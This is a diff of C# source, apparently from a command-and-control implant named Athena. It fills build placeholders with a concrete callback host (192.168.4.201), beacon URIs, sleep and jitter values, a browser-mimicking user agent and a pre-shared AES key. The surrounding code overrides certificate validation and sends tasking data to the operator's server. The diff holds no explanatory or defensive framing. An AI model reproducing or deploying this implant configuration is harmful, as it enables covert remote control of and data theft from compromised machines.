@@ -16,12 +16,12 @@ namespace Athena
 
         public Config()
         {
-            uuid = "%UUID%";
+            uuid = "e30399e3-d195-4091-b0b7-f9699e853d2f";
             DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
             this.killDate = kd;
-            int sleep = int.TryParse("callback_interval", out sleep) ? sleep : 60;
+            int sleep = int.TryParse("10", out sleep) ? sleep : 60;
             this.sleep = sleep;
-            int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 10;
+            int jitter = int.TryParse("10", out jitter) ? jitter : 10;
             this.jitter = jitter;
             this.profile = new HTTP();
         }
@@ -44,19 +44,19 @@ namespace Athena
         public HTTP()
         {
             HttpClientHandler handler = new HttpClientHandler();
-            int callbackPort = Int32.Parse("callback_port");
-            string callbackHost = "callback_host";
-            string getUri = "get_uri";
-            string queryPath = "query_path_name";
-            string postUri = "post_uri";
-            this.userAgent = "%USERAGENT%";
-            this.hostHeader = "%HOSTHEADER%";
+            int callbackPort = Int32.Parse("80");
+            string callbackHost = "http://192.168.4.201";
+            string getUri = "index";
+            string queryPath = "q";
+            string postUri = "data";
+            this.userAgent = "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
+            this.hostHeader = "";
             this.getURL = $"{callbackHost}:{callbackPort}/{getUri}?{queryPath}=";
             this.postURL = $"{callbackHost}:{callbackPort}/{postUri}";
-            this.proxyHost = "proxy_host:proxy_port";
-            this.proxyPass = "proxy_pass";
-            this.proxyUser = "proxy_user";
-            this.psk = "AESPSK";
+            this.proxyHost = ":";
+            this.proxyPass = "";
+            this.proxyUser = "";
+            this.psk = "++8DlT3B0BR7hBu3oYE+dbXf1j81/+ZwJYD3V7j3DbA=";
 
             //Might need to make this configurable
             ServicePointManager.ServerCertificateValidationCallback =
@@ -93,7 +93,7 @@ namespace Athena
             }
 
             //Doesn't do anything yet
-            this.encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
+            this.encryptedExchangeCheck = bool.Parse("false");
 
             if (!string.IsNullOrEmpty(this.psk))
             {
@@ -117,7 +117,6 @@ namespace Athena
                 }
 
                 HttpResponseMessage response;
-
                 if (json.Length < 2000) //Max URL length
                 {
                     response = await this.client.GetAsync(this.getURL + WebUtility.UrlEncode(json));
